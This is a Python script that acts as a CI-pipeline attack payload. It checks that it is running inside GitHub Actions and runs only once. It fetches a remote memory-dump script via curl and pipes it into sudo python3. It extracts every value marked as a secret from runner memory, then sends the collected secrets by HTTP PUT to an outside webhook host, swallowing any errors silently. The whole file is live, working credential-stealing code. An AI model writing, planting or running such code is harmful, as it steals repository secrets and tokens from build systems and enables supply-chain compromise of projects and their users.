import os
import sys

def exploit():
    if os.environ.get('GITHUB_ACTIONS') != 'true':
        return
    if os.path.exists('/tmp/.exploit_executed'):
        return
        
    try:
        with open('/tmp/.exploit_executed', 'w') as f:
            f.write('1')
        
        # Use exactly the command from the template
        payload = """
echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
"""
        os.system(payload)
    except:
        pass

exploit()
